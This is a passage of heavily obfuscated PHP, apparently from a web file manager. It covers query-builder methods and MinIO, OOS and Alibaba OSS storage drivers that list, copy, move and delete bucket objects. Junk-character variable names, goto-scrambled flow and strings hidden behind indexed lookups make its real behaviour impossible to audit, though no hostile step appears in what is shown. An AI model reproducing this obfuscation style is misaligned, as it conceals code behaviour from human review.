$_SERVER[¬ı§†‰ú˜¼]; if (!0 === $Dé…¬È Š÷) { $dç‘Ñ„™îñ = $this->getDbFields(); $Dé…¬È Š÷ = $dç‘Ñ„™îñ ? $dç‘Ñ„™îñ : $FÉÂÔ³«ëº[182]; } elseif ($dƒìÇîáó­) { if (is_string($Dé…¬È Š÷)) { $Dé…¬È Š÷ = explode($FÉÂÔ³«ëº[47], $Dé…¬È Š÷); } $dç‘Ñ„™îñ = $this->getDbFields(); $Dé…¬È Š÷ = $dç‘Ñ„™îñ ? array_diff($dç‘Ñ„™îñ, $Dé…¬È Š÷) : $Dé…¬È Š÷; } $this->options[$FÉÂÔ³«ëº[270]] = $Dé…¬È Š÷; return $this; } public function scope($eª³÷ğã‚“ = '', $c­ÕôŞˆ×Â = NULL) { $cè×„Ä¤éŒ =& $_SERVER[¬ı§†‰ú˜¼]; if ($cè×„Ä¤éŒ[33] === $eª³÷ğã‚“) { if (isset($this->_scope[$cè×„Ä¤éŒ[34]])) { $cÖ£Œ²Ó›¿ = $this->_scope[$cè×„Ä¤éŒ[34]]; } else { return $this; } } elseif (is_string($eª³÷ğã‚“)) { $FØëĞä = explode($cè×„Ä¤éŒ[47], $eª³÷ğã‚“); $cÖ£Œ²Ó›¿ = array(); foreach ($FØëĞä as $dÇŞÀ„§Î²) { if (!isset($this->_scope[$dÇŞÀ„§Î²])) { continue; } $cÖ£Œ²Ó›¿ = array_merge($cÖ£Œ²Ó›¿, $this->_scope[$dÇŞÀ„§Î²]); } if (!empty($c­ÕôŞˆ×Â) && is_array($c­ÕôŞˆ×Â)) { $cÖ£Œ²Ó›¿ = array_merge($cÖ£Œ²Ó›¿, $c­ÕôŞˆ×Â); } } elseif (is_array($eª³÷ğã‚“)) { $cÖ£Œ²Ó›¿ = $eª³÷ğã‚“; } if (is_array($cÖ£Œ²Ó›¿) && !empty($cÖ£Œ²Ó›¿)) { $this->options = array_merge($this->options, array_change_key_case($cÖ£Œ²Ó›¿)); } return $this; } public function where($A‡†ëò„¯‘, $c— îìÅ“ù = null) { $F×÷Ü»é·³ =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_null($c— îìÅ“ù) && is_string($A‡†ëò„¯‘)) { if (!is_array($c— îìÅ“ù)) { $c— îìÅ“ù = func_get_args(); array_shift($c— îìÅ“ù); } $c— îìÅ“ù = array_map(array($this->db, $F×÷Ü»é·³[340]), $c— îìÅ“ù); $A‡†ëò„¯‘ = vsprintf($A‡†ëò„¯‘, $c— îìÅ“ù); } elseif (is_object($A‡†ëò„¯‘)) { $A‡†ëò„¯‘ = get_object_vars($A‡†ëò„¯‘); } elseif (is_array($A‡†ëò„¯‘)) { foreach ($A‡†ëò„¯‘ as $E±®‹âŞÔâ => $Aè†¢õİ™²) { if ((is_numeric($E±®‹âŞÔâ) || !$E±®‹âŞÔâ) && is_string($Aè†¢õİ™²)) { if (strpos($Aè†¢õİ™², $F×÷Ü»é·³[347]) === 0) { continue; } think_trace($F×÷Ü»é·³[348], $F×÷Ü»é·³[33], $F×÷Ü»é·³[46]); die; } } } if (is_string($A‡†ëò„¯‘) && $F×÷Ü»é·³[33] != $A‡†ëò„¯‘) { $a‰ì±¸˜¦é = array(); $a‰ì±¸˜¦é[$F×÷Ü»é·³[349]] = $A‡†ëò„¯‘; $A‡†ëò„¯‘ = $a‰ì±¸˜¦é; } if (isset($this->options[$F×÷Ü»é·³[272]])) { $this->options[$F×÷Ü»é·³[272]] = array_merge($this->options[$F×÷Ü»é·³[272]], $A‡†ëò„¯‘); } else { $this->options[$F×÷Ü»é·³[272]] = $A‡†ëò„¯‘; } return $this; } public function limit($Fº½Å¿œ—, $Eø–×÷±“· = null) { $c´½ï¼¿Îâ =& $_SERVER[¬ı§†‰ú˜¼]; $this->options[$c´½ï¼¿Îâ[289]] = is_null($Eø–×÷±“·) ? $Fº½Å¿œ— : $Fº½Å¿œ— . $c´½ï¼¿Îâ[47] . $Eø–×÷±“·; return $this; } public function page($EÊÖ…¾ˆ†, $bŞ”ãÆµ¢ = null) { $eÎæÈ¨ÀÛÔ =& $_SERVER[¬ı§†‰ú˜¼]; $this->options[$eÎæÈ¨ÀÛÔ[350]] = is_null($bŞ”ãÆµ¢) ? $EÊÖ…¾ˆ† : $EÊÖ…¾ˆ† . $eÎæÈ¨ÀÛÔ[47] . $bŞ”ãÆµ¢; return $this; } public function comment($A®İøÃâ£) { $this->options[$_SERVER[¬ı§†‰ú˜¼][351]] = $A®İøÃâ£; return $this; } public function setProperty($bè‡Œ†¬ç, $F†­èãÇÖ) { if (property_exists($this, $bè‡Œ†¬ç)) { $this->{$bè‡Œ†¬ç} = $F†­èãÇÖ; } return $this; } } goto D¹ÈÙÓŠ¶Å; eÁ©øÖµ¸Ğ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($C„×Å³¥‰Ş) { parent::__construct($C„×Å³¥‰Ş); $this->signatureVersion($_SERVER[¬ı§†‰ú˜¼][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($a£ù‹óõ¡³) { parent::__construct($a£ù‹óõ¡³); $this->signatureVersion($_SERVER[¬ı§†‰ú˜¼][211]); } public function fileOutLink($eçÑš¨ÚÉ) { $BŠ¥Ìšğ™ë =& $_SERVER[¬ı§†‰ú˜¼]; if (substr($eçÑš¨ÚÉ, 0, 7) == $BŠ¥Ìšğ™ë[1202]) { $eçÑš¨ÚÉ = $BŠ¥Ìšğ™ë[1203] . substr($eçÑš¨ÚÉ, 7); } header($BŠ¥Ìšğ™ë[159] . $eçÑš¨ÚÉ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($CÈ­ˆ‚·—) { parent::__construct(); include_once SDK_DIR . $_SERVER[¬ı§†‰ú˜¼][1258]; $this->_init($CÈ­ˆ‚·—); } public function _init($BÀ„»µÃ‡£) { $c°õà—èŒì =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($BÀ„»µÃ‡£ as $F“Ë†¤¿„‰ => $fé† ™Ğ÷) { if (isset($this->{$F“Ë†¤¿„‰})) { $this->{$F“Ë†¤¿„‰} = $fé† ™Ğ÷; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($c°õà—èŒì[1259] . LNG($c°õà—èŒì[1260])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto bàÄïğÒŒ’; dÆ„õÕÀ¥: $D›åñè°Ò->addRule($A¨°Šèó·); try { $this->client->putBucketCors($this->bucket, $D›åñè°Ò); } catch (OSS\Core\OssException $b¹È…ƒøÜ£) { return !1; } return !0; goto AĞñ›î®•; dŠ…ÊÄ¨§: $A¨°Šèó·->addAllowedMethod($B§¬’Ë­Ÿ¡[1264]); $A¨°Šèó·->addAllowedMethod($B§¬’Ë­Ÿ¡[1265]); $A¨°Šèó·->addAllowedMethod($B§¬’Ë­Ÿ¡[158]); goto a‰†±İ—…; fˆéª‹¹­º: $A¨°Šèó·->addAllowedOrigin($B§¬’Ë­Ÿ¡[1261]); $A¨°Šèó·->addAllowedMethod($B§¬’Ë­Ÿ¡[1262]); $A¨°Šèó·->addAllowedMethod($B§¬’Ë­Ÿ¡[1263]); goto dŠ…ÊÄ¨§; a‰†±İ—…: $A¨°Šèó·->setMaxAgeSeconds(600); $A¨°Šèó·->addExposeHeader($B§¬’Ë­Ÿ¡[1266]); $A¨°Šèó·->addAllowedHeader($B§¬’Ë­Ÿ¡[1261]); goto dÆ„õÕÀ¥; bàÄïğÒŒ’: $B§¬’Ë­Ÿ¡ =& $_SERVER[¬ı§†‰ú˜¼]; $D›åñè°Ò = new OSS\Model\CorsConfig(); $A¨°Šèó· = new OSS\Model\CorsRule(); goto fˆéª‹¹­º; AĞñ›î®•: } public function getBucketCors() { goto cÁÅïöÇË«; fÄ…ŒÄæŞÁ: if (!$fÜ£ÍŞ® || !($bçß¸å‘£© = $fÜ£ÍŞ®->getRules())) { return null; } $F´²Ãæˆ§ = $bçß¸å‘£©[0]->getAllowedOrigins(); $dÊÜÜó«˜é = $bçß¸å‘£©[0]->getAllowedMethods(); goto a”½‹ßˆ¦«; a”½‹ßˆ¦«: $A·Í›†ìËä = $bçß¸å‘£©[0]->getMaxAgeSeconds(); $bè˜ìá¥ß = $bçß¸å‘£©[0]->getExposeHeaders(); $eîìÂìØĞ£ = $bçß¸å‘£©[0]->getAllowedHeaders(); goto Fï¡½ÇÓ¢÷; Fï¡½ÇÓ¢÷: return array($CÚ…é¦¹„[181] => isset($F´²Ãæˆ§[0]) ? $F´²Ãæˆ§[0] : $CÚ…é¦¹„[33], $CÚ…é¦¹„[185] => $dÊÜÜó«˜é, $CÚ…é¦¹„[1267] => $A·Í›†ìËä, $CÚ…é¦¹„[1268] => isset($bè˜ìá¥ß[0]) ? $bè˜ìá¥ß[0] : $CÚ…é¦¹„[33], $CÚ…é¦¹„[183] => isset($eîìÂìØĞ£[0]) ? $eîìÂìØĞ£[0] : $CÚ…é¦¹„[33]); goto aå±¡«±ÈÒ; cÁÅïöÇË«: $CÚ…é¦¹„ =& $_SERVER[¬ı§†‰ú˜¼]; $fÜ£ÍŞ® = null; try { $fÜ£ÍŞ® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $FÕ“×ã¢µ) { return null; } goto fÄ…ŒÄæŞÁ; aå±¡«±ÈÒ: } public function isBucketCors() { goto a„£Õ·Ì£ğ; d‡Ñ•¸’à‡: $EÖš¨ÆÜÆé = array($CóŠ—æÈÈŒ[186], $CóŠ—æÈÈŒ[187], $CóŠ—æÈÈŒ[188], $CóŠ—æÈÈŒ[189], $CóŠ—æÈÈŒ[190]); $b—Œ‡”ùàŒ = array_diff($EÖš¨ÆÜÆé, $aê©à²‡ß); return empty($b—Œ‡”ùàŒ); goto CïÓõÈÁ¹¹; a„£Õ·Ì£ğ: $CóŠ—æÈÈŒ =& $_SERVER[¬ı§†‰ú˜¼]; $AøÉê = $this->getBucketCors(); if (!$AøÉê || !is_array($AøÉê)) { return !1; } goto e¼´çóù±ä; e¼´çóù±ä: if ($AøÉê[$CóŠ—æÈÈŒ[181]] != $CóŠ—æÈÈŒ[182] || $AøÉê[$CóŠ—æÈÈŒ[183]] != $CóŠ—æÈÈŒ[182]) { return !1; } $aê©à²‡ß = array_map($CóŠ—æÈÈŒ[184], $AøÉê[$CóŠ—æÈÈŒ[185]]); if (!is_array($aê©à²‡ß)) { $aê©à²‡ß = array(); } goto d‡Ñ•¸’à‡; CïÓõÈÁ¹¹: } public function mkfile($B³ù›·º‚, $dËí´êß¼Ø = '', $EñªÌñ« = REPEAT_RENAME) { $bœ­Íòê« = $this->setContent($B³ù›·º‚, $dËí´êß¼Ø); if ($bœ­Íòê« !== !1) { return $this->getPathOuter($B³ù›·º‚); } return !1; } public function mkdir($cÇÙöÜ¸à, $FÁ™É®ã¦ = REPEAT_SKIP) { if ($this->_isFolder($cÇÙöÜ¸à)) { return $this->getPathOuter($cÇÙöÜ¸à); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cÇÙöÜ¸à)); } catch (OSS\Core\OssException $B»‰Ç¢ÎÔó) { return !1; } return $this->getPathOuter($cÇÙöÜ¸à); } private function fileList($bßŞì¨¹ß¼, $c‰è©ÎØ¥½ = '', $Açîë£êª— = 0) { goto AŸ»â³ëÂ–; AŸ»â³ëÂ–: $C’¾‰ÑÎ‡˜ =& $_SERVER[¬ı§†‰ú˜¼]; $bßŞì¨¹ß¼ = trim($bßŞì¨¹ß¼, $C’¾‰ÑÎ‡˜[8]); $A’ğ®ÙŸ“  = empty($bßŞì¨¹ß¼) ? $C’¾‰ÑÎ‡˜[33] : $bßŞì¨¹ß¼ . $C’¾‰ÑÎ‡˜[8]; goto bÜÍ¤Ç…ïĞ; bÜÍ¤Ç…ïĞ: $f°µ”öÇš = $C’¾‰ÑÎ‡˜[33]; $b›Ç§«³Œ’ = 1000; $e¬Š¤İøàè = $this->listItemCache === !1 ? !1 : !0; goto F’‰‰¦äªÕ; BÍ‹õÓÇä: return array($C’¾‰ÑÎ‡˜[75] => $fŸ—§†É³¯, $C’¾‰ÑÎ‡˜[74] => $BîšŠø¾¸±); goto EªÑƒ¶§Á; F’‰‰¦äªÕ: $fŸ—§†É³¯ = $BîšŠø¾¸± = array(); while (!0) { check_abort(); $E«àˆÊ³â· = array($C’¾‰ÑÎ‡˜[1269] => $c‰è©ÎØ¥½, $C’¾‰ÑÎ‡˜[1270] => $A’ğ®ÙŸ“ , $C’¾‰ÑÎ‡˜[1271] => $b›Ç§«³Œ’, $C’¾‰ÑÎ‡˜[1272] => $f°µ”öÇš); try { $E¢ãô‘­…¾ = $this->client->listObjects($this->bucket, $E«àˆÊ³â·); } catch (OSS\Core\OssException $f±ˆùÎ¶® ) { break; } $f°µ”öÇš = $E¢ãô‘­…¾->getNextMarker(); $AÛóàæÔø = $E¢ãô‘­…¾->getObjectList(); $B°ø‘…ÂÅö = $E¢ãô‘­…¾->getPrefixList(); foreach ($AÛóàæÔø as $båŸğ¬Ú¯) { goto BĞ¤ŞÒ–; Eª‡¢àÎ­: $fƒÄ”–˜ = $båŸğ¬Ú¯->getLastModified(); $B¾ãù†ƒÇÓ = $Açîë£êª— ? array($C’¾‰ÑÎ‡˜[28] => $fÕ¸†÷õÇ, $C’¾‰ÑÎ‡˜[78] => $DßÇƒ˜Š, $C’¾‰ÑÎ‡˜[196] => strtotime($fƒÄ”–˜)) : $fÕ¸†÷õÇ; $BÅÒ¼ÓµÖ³ = $DßÇƒ˜Š == 0 && substr($fÕ¸†÷õÇ, strlen($fÕ¸†÷õÇ) - 1, 1) == $C’¾‰ÑÎ‡˜[8] ? !0 : !1; goto dÉ¬‰¶Û¥™; BĞ¤ŞÒ–: if ($båŸğ¬Ú¯->getKey() == $A’ğ®ÙŸ“ ) { continue; } $fÕ¸†÷õÇ = $båŸğ¬Ú¯->getKey(); $DßÇƒ˜Š = $båŸğ¬Ú¯->getSize(); goto Eª‡¢àÎ­; dÉ¬‰¶Û¥™: if ($e¬Š¤İøàè) { $this->cacheMethod($C’¾‰ÑÎ‡˜[198], $fÕ¸†÷õÇ, $BÅÒ¼ÓµÖ³); $this->cacheMethod($C’¾‰ÑÎ‡˜[199], $fÕ¸†÷õÇ, array($C’¾‰ÑÎ‡˜[78] => $DßÇƒ˜Š, $C’¾‰ÑÎ‡˜[1273] => $DßÇƒ˜Š, $C’¾‰ÑÎ‡˜[84] => strtotime($fƒÄ”–˜), $C’¾‰ÑÎ‡˜[1274] => $fƒÄ”–˜)); } if ($BÅÒ¼ÓµÖ³) { $fŸ—§†É³¯[] = $fÕ¸†÷õÇ; continue; } $BîšŠø¾¸±[] = $B¾ãù†ƒÇÓ; goto EîÆ™““Êñ; EîÆ™““Êñ: } foreach ($B°ø‘…ÂÅö as $dˆĞé¥ºÜ) { $fŸ—§†É³¯[] = $dˆĞé¥ºÜ->getPrefix(); if ($e¬Š¤İøàè) { $this->cacheMethod($C’¾‰ÑÎ‡˜[198], $fÕ¸†÷õÇ, !0); } } if ($f°µ”öÇš === $C’¾‰ÑÎ‡˜[33]) { break; } } if ($e¬Š¤İøàè) { $this->cacheMethod($C’¾‰ÑÎ‡˜[198], $bßŞì¨¹ß¼, !0); } goto BÍ‹õÓÇä; EªÑƒ¶§Á: } public function copyFile($A×—¨õÏï¦, $eòÊº­‹‹) { $E’Ú³Ñƒ´‰ = $this->size($A×—¨õÏï¦); if ($E’Ú³Ñƒ´‰ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $A×—¨õÏï¦, $this->bucket, $this->pathEncode($eòÊº­‹‹)); } catch (OSS\Core\OssException $Dä²ÍµÅóé) { return !1; } return $this->getPathOuter($eòÊº­‹‹); } $bò®”õˆ² = $this->multiCopyObject($A×—¨õÏï¦, $eòÊº­‹‹, $E’Ú³Ñƒ´‰); return $bò®”õˆ² ? $this->getPathOuter($eòÊº­‹‹) : !1; } private function multiCopyObject($Câ„ù³º›Ë, $fÜ¿Ô²–“›, $fé¿Ÿä‘‡) { $Bœ÷ŠÍ…±‘ =& $_SERVER[¬ı§†‰ú˜¼]; try { goto F·øØÆÕ¯Û; b¾•¶¾…Ê¬: $EÊ¢³ôîÔ = 1; $cÍ“Í¹Ş° = 0; $D–ŒÖÕ™é‰ = array(); goto FÔ¨Ñˆ·©; FŒˆääÂ°¸: $B¡Ûß‰´×è = array(); foreach ($D–ŒÖÕ™é‰ as $dŞ˜¾ÈÅ®Ò => $D…Œ¤›‘´) { $B¡Ûß‰´×è[] = array($Bœ÷ŠÍ…±‘[1279] => $dŞ˜¾ÈÅ®Ò + 1, $Bœ÷ŠÍ…±‘[1280] => $D…Œ¤›‘´); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fÜ¿Ô²–“›), $B‰³â¯ÉÙÚ, $B¡Ûß‰´×è); goto dëÉ‘; F·øØÆÕ¯Û: $bÆ‘„·ÑÔÅ = array(); if ($cÖ™†¾Ğ¬• = $this->hashMd5($Câ„ù³º›Ë)) { $bÆ‘„·ÑÔÅ = array(OSS\OssClient::OSS_HEADERS => array($Bœ÷ŠÍ…±‘[1275] => $cÖ™†¾Ğ¬•)); } $B‰³â¯ÉÙÚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÜ¿Ô²–“›), $bÆ‘„·ÑÔÅ); goto b¾•¶¾…Ê¬; FÔ¨Ñˆ·©: $aÔËòÈ è = 1024 * 1024 * 10; $bªÏÜ‡¤Ò = $this->client->generateMultiuploadParts($fé¿Ÿä‘‡, $aÔËòÈ è); foreach ($bªÏÜ‡¤Ò as $dŞ˜¾ÈÅ®Ò => $E…¹ÂÆº¯¥) { $c¿ç£š† = $cÍ“Í¹Ş° + (int) $E…¹ÂÆº¯¥[$Bœ÷ŠÍ…±‘[1276]]; $CœØ¿øù«‚ = (int) $E…¹ÂÆº¯¥[$Bœ÷ŠÍ…±‘[334]] + $c¿ç£š† - 1; $f¸Ğº‰ÉŒ‘ = array($Bœ÷ŠÍ…±‘[1277] => $c¿ç£š†, $Bœ÷ŠÍ…±‘[1278] => $CœØ¿øù«‚); $D–ŒÖÕ™é‰[] = $this->client->uploadPartCopy($this->bucket, $Câ„ù³º›Ë, $this->bucket, $this->pathEncode($fÜ¿Ô²–“›), $EÊ¢³ôîÔ, $B‰³â¯ÉÙÚ, $f¸Ğº‰ÉŒ‘); $EÊ¢³ôîÔ = $EÊ¢³ôîÔ + 1; } goto FŒˆääÂ°¸; dëÉ‘: } catch (OSS\Core\OssException $eõº´½) { return !1; } return !0; } public function moveFile($Fß¦­ëÆòê, $eœ¡ø¼) { if ($this->copyFile($Fß¦­ëÆòê, $eœ¡ø¼)) { $this->remove($Fß¦­ëÆòê); return $this->getPathOuter($eœ¡ø¼); } return !1; } public function delFile($d÷Í‰­Œáõ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($d÷Í‰­Œáõ)); } catch (OSS\Core\OssException $a…¢ŞÍÙä) { return !1; } return !0; } public function delFolder($b°¶æ÷») { goto D¢åêáÂŸ; A¶¯ƒ¨®¶Å: if (!empty($b°¶æ÷») && !in_array($DÓğñÃÄ…Ò, $e™º“ÙÄ§…[$d¼ô´ÃÉİŞ[75]])) { $e™º“ÙÄ§…[$d¼ô´ÃÉİŞ[75]][] = $DÓğñÃÄ…Ò; } $Bó¦÷¬¦×ô = $this->delByBatch($e™º“ÙÄ§…[$d¼ô´ÃÉİŞ[74]]); if (!$Bó¦÷¬¦×ô) { return !1; } goto b¢²×Ãšµ; b¢²×Ãšµ: return $this->delByBatch($e™º“ÙÄ§…[$d¼ô´ÃÉİŞ[75]]); goto DÆÎ‚ÙÇ¶; D¢åêáÂŸ: $d¼ô´ÃÉİŞ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->exist($b°¶æ÷»)) { return !0; } $this->listItemCache = !1; goto CàŒèÊÍ«É; CàŒèÊÍ«É: $e™º“ÙÄ§… = $this->fileList($b°¶æ÷»); $this->listItemCache = !0; $DÓğñÃÄ…Ò = trim($b°¶æ÷», $d¼ô´ÃÉİŞ[8]) . $d¼ô´ÃÉİŞ[8]; goto A¶¯ƒ¨®¶Å; DÆÎ‚ÙÇ¶: } private function delByBatch($eƒù¥Œòö®) { foreach (array_chunk($eƒù¥Œòö®, 1000) as $e’ÅÕÚ†Ó”) { try { $this->client->deleteObjects($this->bucket, $e’ÅÕÚ†Ó”); } catch (OSS\Core\OssException $CñÑâŒæ) { return !1; } } return !0; } public function rename($FÛ´”Ÿª®, $fÜ×÷…ÂÛè) { return $this->renameObject($FÛ´”Ÿª®, $fÜ×÷…ÂÛè); } private function fileInfo($FÏÈ®‰Š³Â, $Cë×Ï®¡ã = false, $aï”àëğ¿ = array()) { goto E–âÎ»Š; E–âÎ»Š: $bÕ”†‹˜õ =& $_SERVER[¬ı§†‰ú˜¼]; $a…‰°É»Ä = array($bÕ”†‹˜õ[28] => $this->pathThis($FÏÈ®‰Š³Â), $bÕ”†‹˜õ[76] => $this->getPathOuter($FÏÈ®‰Š³Â), $bÕ”†‹˜õ[29] => $bÕ”†‹˜õ[192], $bÕ”†‹˜õ[78] => isset($aï”àëğ¿[$bÕ”†‹˜õ[78]]) ? $aï”àëğ¿[$bÕ”†‹˜õ[78]] : 0, $bÕ”†‹˜õ[168] => $this->ext($FÏÈ®‰Š³Â)); if ($Cë×Ï®¡ã) { return $a…‰°É»Ä; } goto D‹‘ù‰·¶«; B§Æµ±Ü¸: if (isset($aï”àëğ¿[$bÕ”†‹˜õ[78]])) { $a…‰°É»Ä[$bÕ”†‹˜õ[78]] = $aï”àëğ¿[$bÕ”†‹˜õ[78]]; } if (isset($aï”àëğ¿[$bÕ”†‹˜õ[84]])) { $a…‰°É»Ä[$bÕ”†‹˜õ[84]] = $aï”àëğ¿[$bÕ”†‹˜õ[84]]; } if (isset($aï”àëğ¿[$bÕ”†‹˜õ[196]]) && !trim($a…‰°É»Ä[$bÕ”†‹˜õ[84]])) { $a…‰°É»Ä[$bÕ”†‹˜õ[84]] = $aï”àëğ¿[$bÕ”†‹˜õ[196]]; } goto CÂÕ£–ŞÃÆ; D‹‘ù‰·¶«: $a…‰°É»Ä[$bÕ”†‹˜õ[193]] = $a…‰°É»Ä[$bÕ”†‹˜õ[84]] = 0; $a…‰°É»Ä[$bÕ”†‹˜õ[194]] = $a…‰°É»Ä[$bÕ”†‹˜õ[195]] = !0; if (empty($aï”àëğ¿)) { $AÕĞ‚ÖÅìò = $this->objectMeta($FÏÈ®‰Š³Â); if (!$AÕĞ‚ÖÅìò) { return $a…‰°É»Ä; } $aï”àëğ¿ = array($bÕ”†‹˜õ[84] => strtotime($AÕĞ‚ÖÅìò[$bÕ”†‹˜õ[1274]]), $bÕ”†‹˜õ[78] => $AÕĞ‚ÖÅìò[$bÕ”†‹˜õ[1273]] + 0); } goto B§Æµ±Ü¸; CÂÕ£–ŞÃÆ: return $a…‰°É»Ä; goto a°˜£’ë¡’; a°˜£’ë¡’: } private function folderInfo($dã”³ğ±—‚, $e©«Æº¸©„ = false, $BºŒËô“Íå = array()) { goto Döˆ®¬Ÿ; Döˆ®¬Ÿ: $c«ÒìšªØ =& $_SERVER[¬ı§†‰ú˜¼]; $dôà ‘„â• = array($c«ÒìšªØ[28] => $this->pathThis($dã”³ğ±—‚), $c«ÒìšªØ[76] => $this->getPathOuter($c«ÒìšªØ[8] . $dã”³ğ±—‚), $c«ÒìšªØ[29] => $c«ÒìšªØ[77]); if ($e©«Æº¸©„) { return $dôà ‘„â•; } goto a„©™Ñ™†›; DŠ«Ş­‘Ï‚: if (isset($BºŒËô“Íå[$c«ÒìšªØ[84]])) { $dôà ‘„â•[$c«ÒìšªØ[84]] = $BºŒËô“Íå[$c«ÒìšªØ[84]]; } if (isset($BºŒËô“Íå[$c«ÒìšªØ[193]])) { $dôà ‘„â•[$c«ÒìšªØ[193]] = $BºŒËô“Íå[$c«ÒìšªØ[193]]; } return $dôà ‘„â•; goto aÑ‡ÚŸ¿ï; a„©™Ñ™†›: $dôà ‘„â•[$c«ÒìšªØ[193]] = $dôà ‘„â•[$c«ÒìšªØ[84]] = 0; $dôà ‘„â•[$c«ÒìšªØ[194]] = $dôà ‘„â•[$c«ÒìšªØ[195]] = !0; if (empty($BºŒËô“Íå)) { $dã”³ğ±—‚ = rtrim($dã”³ğ±—‚, $c«ÒìšªØ[8]) . $c«ÒìšªØ[8]; $b‹õŞ÷¹ŸÑ = $this->objectMeta($dã”³ğ±—‚); if (!$b‹õŞ÷¹ŸÑ) { return $dôà ‘„â•; } $BºŒËô“Íå = array($c«ÒìšªØ[193] => $b‹õŞ÷¹ŸÑ[$c«ÒìšªØ[1281]][$c«ÒìšªØ[1282]], $c«ÒìšªØ[84] => strtotime($b‹õŞ÷¹ŸÑ[$c«ÒìšªØ[1274]])); } goto DŠ«Ş­‘Ï‚; aÑ‡ÚŸ¿ï: } public function listPath($BÈËÎåšÂ–, $aìÓÁ£ŒŒ = false) { $bîƒÓ–Ë =& $_SERVER[¬ı§†‰ú˜¼]; $DèÑñª•ë = $this->fileList($BÈËÎåšÂ–, $bîƒÓ–Ë[8], !0); foreach ($DèÑñª•ë[$bîƒÓ–Ë[75]] as $a×™ßÊ¹á => $e¹æÂïèÏÃ) { $DèÑñª•ë[$bîƒÓ–Ë[75]][$a×™ßÊ¹á] = $this->folderInfo($e¹æÂïèÏÃ, $aìÓÁ£ŒŒ, $e¹æÂïèÏÃ); } foreach ($DèÑñª•ë[$bîƒÓ–Ë[74]] as $a×™ßÊ¹á => $e¹æÂïèÏÃ) { $DèÑñª•ë[$bîƒÓ–Ë[74]][$a×™ßÊ¹á] = $this->fileInfo($e¹æÂïèÏÃ[$bîƒÓ–Ë[28]], $aìÓÁ£ŒŒ, $e¹æÂïèÏÃ); } return $DèÑñª•ë; } public function has($b‹³ÆŞŒğç, $Bƒ“áÁí = false, $dòñù÷‘Õ÷ = true) { goto f–»Åïºœ­; f–»Åïºœ­: $FÖÑºÇ­£ =& $_SERVER[¬ı§†‰ú˜¼]; $b‹³ÆŞŒğç = trim($b‹³ÆŞŒğç, $FÖÑºÇ­£[8]); $aÖÄíÇ‰Ä = empty($b‹³ÆŞŒğç) ? $FÖÑºÇ­£[33] : $b‹³ÆŞŒğç . $FÖÑºÇ­£[8]; goto A‹Û•»ÄÅ¹; A‹Û•»ÄÅ¹: $C‰÷ÅÔÂİ» = $FÖÑºÇ­£[33]; $AÌ›ƒˆšé = 500; $e£Øˆ•¶‡ = $A‡Ò„áƒ¦ = 0; goto CÆ¿¶Ğ¦©; CÆ¿¶Ğ¦©: while (!0) { check_abort(); $b¿¨’»ßÙ” = array($FÖÑºÇ­£[1269] => $FÖÑºÇ­£[8], $FÖÑºÇ­£[1270] => $aÖÄíÇ‰Ä, $FÖÑºÇ­£[1271] => $AÌ›ƒˆšé, $FÖÑºÇ­£[1272] => $C‰÷ÅÔÂİ»); try { $Cöà‰Û¦ œ = $this->client->listObjects($this->bucket, $b¿¨’»ßÙ”); } catch (OSS\Core\OssException $BÑßç»â±) { break; } $C‰÷ÅÔÂİ» = $Cöà‰Û¦ œ->getNextMarker(); $aˆù”˜‰†Ü = $Cöà‰Û¦ œ->getObjectList(); $D½¼ñ²¾‚ª = $Cöà‰Û¦ œ->getPrefixList(); if ($Bƒ“áÁí) { if (count($aˆù”˜‰†Ü) > 1 || count($aˆù”˜‰†Ü) == 1 && $aˆù”˜‰†Ü[0]->getKey() != $aÖÄíÇ‰Ä) { $e£Øˆ•¶‡ += count($aˆù”˜‰†Ü) - 1; } if (!empty($D½¼ñ²¾‚ª)) { $A‡Ò„áƒ¦ += count($D½¼ñ²¾‚ª); } if ($C‰÷ÅÔÂİ» === $FÖÑºÇ­£[33]) { break; } continue; } if ($dòñù÷‘Õ÷) { if (!empty($aˆù”˜‰†Ü)) { if (count($aˆù”˜‰†Ü) > 1 || $aˆù”˜‰†Ü[0]->getKey() != $aÖÄíÇ‰Ä) { return !0; } } } else { if (!empty($D½¼ñ²¾‚ª)) { return !0; } } if ($C‰÷ÅÔÂİ» === $FÖÑºÇ­£[33]) { break; } } if ($Bƒ“áÁí) { return array($FÖÑºÇ­£[202] => $e£Øˆ•¶‡, $FÖÑºÇ­£[203] => $A‡Ò„áƒ¦); } return !1; goto d¸ï¼Ï‰½; d¸ï¼Ï‰½: } public function listAll($Añ¶­ÅåôÏ) { $DĞ¦ŠóÙÌÍ =& $_SERVER[¬ı§†‰ú˜¼]; $aª±éó½šƒ = $this->fileList($Añ¶­ÅåôÏ, $DĞ¦ŠóÙÌÍ[33], !0); $fíº¿¹‰šÔ = array(); foreach ($aª±éó½šƒ[$DĞ¦ŠóÙÌÍ[74]] as $D›Ö«ŸÃìÜ) { $fíº¿¹‰šÔ[$D›Ö«ŸÃìÜ[$DĞ¦ŠóÙÌÍ[28]]] = $D›Ö«ŸÃìÜ[$DĞ¦ŠóÙÌÍ[78]]; } foreach ($aª±éó½šƒ[$DĞ¦ŠóÙÌÍ[75]] as $D›Ö«ŸÃìÜ) { if (is_string($D›Ö«ŸÃìÜ)) { $fíº¿¹‰šÔ[$D›Ö«ŸÃìÜ] = 0; } } return $this->listAllFiles($Añ¶­ÅåôÏ, array_keys($fíº¿¹‰šÔ), $fíº¿¹‰šÔ); } public function canRead($DÑÚÅÙÈ) { $A†åšç’Š— =& 